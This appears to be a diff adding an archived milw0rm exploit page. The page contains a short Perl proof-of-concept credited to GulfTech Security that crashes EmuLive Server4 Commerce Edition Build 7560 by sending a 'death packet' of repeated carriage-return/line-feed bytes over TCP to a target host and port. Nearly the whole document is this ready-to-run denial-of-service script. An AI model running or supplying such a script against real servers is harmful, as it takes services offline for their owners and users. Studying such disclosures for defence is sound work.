@@ -1,0 +1,58 @@
+<html>
+<head>
+<title>milw0rm productions</title>
+<pre>
+#!/usr/bin/perl
+##############################################
+# EmuLive Server4 Commerce Edition Build 7560 
+##############################################
+# Remote crash proof of conecpt code. When the 
+# machine running Server4 recieves a malformed
+# request on TCP port 66 it crashes very hard!
+##############################################
+# GulfTech Security   http://www.gulftech.org
+##############################################
+
+use IO::Socket;
+
+unless ($ARGV[0]) 
+{ 
+	die &quot;usage: s4nomore.pl host port&quot;
+}
+
+	printf(&quot;==========================================================\n&quot;,);
+	printf(&quot; EmuLive Server4 Commerce Edition Build 7560 Remote Crash \n&quot;,);
+	printf(&quot;==========================================================\n&quot;,);
+
+
+	my $host = $ARGV[0];
+	my $port = $ARGV[1];
+
+
+	my $dead = &quot;\x0D\x0A\x0D\x0A\x0D\x0A\x0D\x0A&quot;. #\r\n\r\n\r\n\r\n
+			   &quot;\x0D\x0A\x0D\x0A\x0D\x0A\x0D\x0A&quot;. #\r\n\r\n\r\n\r\n
+			   &quot;\x0D\x0A\x0D\x0A\x0D\x0A\x0D\x0A&quot;. #\r\n\r\n\r\n\r\n
+			   &quot;\x0D\x0A\x0D\x0A\x0D\x0A\x0D\x0A&quot;; #\r\n\r\n\r\n\r\n
+
+
+	my $i = IO::Socket::INET-&gt;new( Proto =&gt; &quot;tcp&quot;,
+							       PeerAddr  =&gt; $host,
+								   PeerPort  =&gt; $port,
+							       Timeout   =&gt; '100',
+							       Type      =&gt; SOCK_STREAM,
+							      ) || die(&quot;Connect Error&quot;);
+
+		printf(&quot;[*] Sending Death Packet To %s\n&quot;, $host);
+		print $i $dead;	
+		$i-&gt;autoflush(1);
+		printf(&quot;[*] Host %s Should Now Be Dead\n&quot;, $host);
+		printf(&quot;[*] Closing Connections And Exiting  \n&quot;);
+		close $i;
+		exit;</pre>
+//downloaded from milw0rm.com
+</html>
+
+
+<!-- BBClone v 0.4.2 OK: counter files updated -->
+
+<!-- BBClone 0.4.2 OK: access files updated -->
